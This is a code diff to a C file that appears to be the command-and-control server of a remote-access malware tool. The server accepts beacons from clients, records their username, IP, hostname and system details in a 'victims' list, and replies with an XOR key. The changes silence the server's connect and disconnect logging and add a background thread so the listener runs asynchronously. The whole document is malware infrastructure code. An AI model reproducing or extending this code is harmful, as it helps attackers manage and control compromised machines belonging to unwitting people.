@@ -109,13 +109,13 @@ void *net_t_client(void *client_fd){
     }
     pthread_mutex_lock(&NET_PTHREAD_MUTEX);
     net_update_victims(p_net_client_beacon);
-    printf("[+] CONNECT user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n",
-           p_net_client_beacon->sysinfo.username,
-           p_net_client_beacon->sysinfo.ip,
-           p_net_client_beacon->sysinfo.hostname,
-           p_net_client_beacon->sysinfo.arch,
-           p_net_client_beacon->sysinfo.release,
-           p_net_client_beacon->sysinfo.cpu_usage);
+    /* printf("[+] CONNECT user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n", */
+    /*        p_net_client_beacon->sysinfo.username, */
+    /*        p_net_client_beacon->sysinfo.ip, */
+    /*        p_net_client_beacon->sysinfo.hostname, */
+    /*        p_net_client_beacon->sysinfo.arch, */
+    /*        p_net_client_beacon->sysinfo.release, */
+    /*        p_net_client_beacon->sysinfo.cpu_usage); */
     pthread_mutex_unlock(&NET_PTHREAD_MUTEX);
     p_net_server_beacon->xor_key = DEFS_XOR_KEY;
     p_net_server_beacon->status = true;
@@ -127,20 +127,21 @@ void *net_t_client(void *client_fd){
   }
   pthread_mutex_lock(&NET_PTHREAD_MUTEX);
   net_remove_victims(p_net_client_beacon);
-  printf("[+] DISCONNECT user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n",
-         p_net_client_beacon->sysinfo.username,
-         p_net_client_beacon->sysinfo.ip,
-         p_net_client_beacon->sysinfo.hostname,
-         p_net_client_beacon->sysinfo.arch,
-         p_net_client_beacon->sysinfo.release,
-         p_net_client_beacon->sysinfo.cpu_usage);
+  /* printf("[+] DISCONNECT user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n", */
+  /*        p_net_client_beacon->sysinfo.username, */
+  /*        p_net_client_beacon->sysinfo.ip, */
+  /*        p_net_client_beacon->sysinfo.hostname, */
+  /*        p_net_client_beacon->sysinfo.arch, */
+  /*        p_net_client_beacon->sysinfo.release, */
+  /*        p_net_client_beacon->sysinfo.cpu_usage); */
   pthread_mutex_unlock(&NET_PTHREAD_MUTEX);
   free(p_net_client_beacon);
   free(p_net_server_beacon);
-  return 0;
+  pthread_exit(NULL);
 }
 
-bool net_start_server(int port){
+
+bool net_server(int port){
   /*
     :TODO: start listening server
     :port: (int) server listening port
@@ -175,10 +176,10 @@ bool net_start_server(int port){
     return false;
   }
 
-  printf("[+] bind to port %d\n", ntohs(server.sin_port));
+  //printf("[+] bind to port %d\n", ntohs(server.sin_port));
 
   if (listen(server_fd, NET_MAX_CLIENTS)  == 0){
-    printf("[*] listening...\n");
+    //printf("[*] listening...\n");
   } else{
     fprintf(stderr, "[x] %s\n", strerror(errno));
     return false;
@@ -194,5 +195,30 @@ bool net_start_server(int port){
     }
   }
   close(client_fd);
+  return true;
+}
+
+#ifndef NET_PTHREAD_SERVER_ASYNC_ARGS
+typedef struct{
+  int port;
+} net_pthread_server_args_t;
+#define NET_PTHREAD_SERVER_ASYNC_ARGS
+#endif
+
+void *net_pthread_server(void *args){
+  net_pthread_server_args_t  *p_net_server_async_args = args;
+  int port = p_net_server_async_args->port;
+  net_server(port);
+  pthread_exit(NULL);
+}
+
+bool net_server_async(int port){
+  net_pthread_server_args_t *p_net_pthread_server_async_args = malloc(sizeof(net_pthread_server_args_t));
+  p_net_pthread_server_async_args->port = port;
+  pthread_t t_net_pthread_server;
+  if(pthread_create(&t_net_pthread_server, NULL, net_pthread_server, p_net_pthread_server_async_args) < 0){
+    fprintf(stderr, "[x] %s\n", strerror(errno));
+    return false;
+  }
   return true;
 }
